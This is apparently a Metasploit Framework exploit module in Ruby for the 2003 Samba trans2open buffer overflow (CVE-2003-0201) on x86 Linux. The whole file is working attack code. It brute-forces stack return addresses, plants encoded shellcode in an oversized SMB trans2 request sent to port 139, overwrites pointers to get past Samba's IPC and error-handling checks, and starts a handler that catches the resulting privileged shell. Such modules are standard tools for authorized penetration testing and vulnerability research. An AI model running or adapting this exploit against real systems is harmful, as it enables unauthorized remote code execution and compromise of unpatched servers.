##
# $Id: trans2open.rb 9828 2010-07-14 17:27:23Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Samba trans2open Overflow (Linux x86)\',
			\'Description\'    => %q{
					This exploits the buffer overflow found in Samba versions
				2.2.0 to 2.2.8. This particular module is capable of
				exploiting the flaw on x86 Linux systems that do not
				have the noexec stack option set.

				NOTE: Some older versions of RedHat do not seem to be vulnerable
				since they apparently do not allow anonymous access to IPC.
			},
			\'Author\'         => [ \'hdm\', \'jduck\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9828 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2003-0201\' ],
					[ \'OSVDB\', \'4469\' ],
					[ \'BID\', \'7294\' ],
					[ \'URL\', \'http://seclists.org/bugtraq/2003/Apr/103\' ]
				],
			\'Privileged\'     => true,
			\'Payload\'        =>
				{
					\'Space\'    => 1024,
					\'BadChars\' => \"\\x00\",
					\'MinNops\'  => 512,
					\'StackAdjustment\' => -3500
				},
			\'Platform\'       => \'linux\',
			\'Targets\'        =>
				[
					# tested OK - jjd:
					# RedHat 7.2 samba-2.2.1a-4 - 0xbffffafc
					# RedHat 9.0 samba-2.2.7a-7.9.0 - 0xbfffddfc
					[ \'Samba 2.2.x - Bruteforce\',
						{
							\'PtrToNonZero\' => 0xbffffff4, # near the bottom of the stack
							\'Offset\'       => 1055,
							\'Bruteforce\'   =>
								{
									\'Start\' => { \'Ret\' => 0xbffffdfc },
									\'Stop\'  => { \'Ret\' => 0xbfa00000 },
									\'Step\'  => 256
								}
						}
					],
				],
			\'DefaultTarget\'  => 0,
			\'DisclosureDate\' => \'Apr 7 2003\'
			))

		register_options(
			[
				Opt::RPORT(139)
			], self.class)
	end

	def brute_exploit(addrs)

		curr_ret = addrs[\'Ret\']
		begin
			print_status(\"Trying return address 0x%.8x...\" %  curr_ret)

			connect
			smb_login

			if ! @checked_peerlm
				if smb_peer_lm !~ /samba/i
					raise RuntimeError, \"This target is not a Samba server (#{smb_peer_lm}\"
				end

				if smb_peer_lm =~ /Samba [34]\\./i
					raise RuntimeError, \"This target is not a vulnerable Samba server (#{smb_peer_lm})\"
				end
			end

			@checked_peerlm = true


			# This value *must* be 1988 to allow findrecv shellcode to work
			# XXX: I\'m not sure the above comment is true...
			pattern = rand_text_english(1988)

			# See the OSX and Solaris versions of this module for additional
			# information.

			# eip_off = 1071 - RH7.2 compiled with -ggdb instead of -O/-O2
			# (rpmbuild -bp ; edited/reran config.status ; make)
			eip_off = target[\'Offset\']
			ptr_to_non_zero = target[\'PtrToNonZero\']

			# Stuff the shellcode into the request
			pattern[0, payload.encoded.length] = payload.encoded

			# We want test true here, so we overwrite conn with a pointer
			# to something non-zero.
			#
			# 222       if (IS_IPC(conn)) {
			# 223          return(ERROR(ERRSRV,ERRaccess));
			# 224       }
			pattern[eip_off + 4, 4] = [ptr_to_non_zero - 0x30].pack(\'V\')

			# We want to avoid crashing on the following two derefences.
			#
			# 116     int error_packet(char *inbuf,char *outbuf,int error_class,uint32 error_code,int line)
			# 117     {
			# 118       int outsize = set_message(outbuf,0,0,True);
			# 119       int cmd = CVAL(inbuf,smb_com);
			pattern[eip_off + 8, 4] = [ptr_to_non_zero - 0x08].pack(\'V\')
			pattern[eip_off + 12, 4] = [ptr_to_non_zero - 0x24].pack(\'V\')

			# This stream covers the framepointer and the return address
			#pattern[1199, 400] = [curr_ret].pack(\'N\') * 100
			pattern[eip_off, 4] = [curr_ret].pack(\'V\')

			trans =
				\"\\x00\\x04\\x08\\x20\\xff\\x53\\x4d\\x42\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+
				\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"+
				\"\\x64\\x00\\x00\\x00\\x00\\xd0\\x07\\x0c\\x00\\xd0\\x07\\x0c\\x00\\x00\\x00\\x00\"+
				\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd0\\x07\\x43\\x00\\x0c\\x00\\x14\\x08\\x01\"+
				\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+
				\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\"+
				pattern

			# puts \"press any key\"; $stdin.gets

			sock.put(trans)
			handler

		rescue ::EOFError
		rescue ::Rex::Proto::SMB::Exceptions::LoginError, ::Interrupt, ::RuntimeError
			raise $!
		rescue ::Exception => e
			print_error(\"#{rhost} #{e}\")
		end

		handler
		disconnect

	end

end

